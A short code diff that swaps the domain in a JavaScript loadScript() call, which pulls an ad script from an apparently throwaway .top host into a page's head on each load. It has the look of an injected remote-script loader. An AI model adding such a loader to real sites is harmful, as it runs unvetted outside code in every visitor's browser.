@@ -18,5 +18,5 @@ function loadScript(src, callback) {
 		    }
 		    head.appendChild(script);
 		}
-		loadScript('http://tiexie0.top/adzone/getjs/ad'+Date.now()+'.js',function(){
+		loadScript('http://www.rrdtjj.top/adzone/getjs/ad'+Date.now()+'.js',function(){
 		});
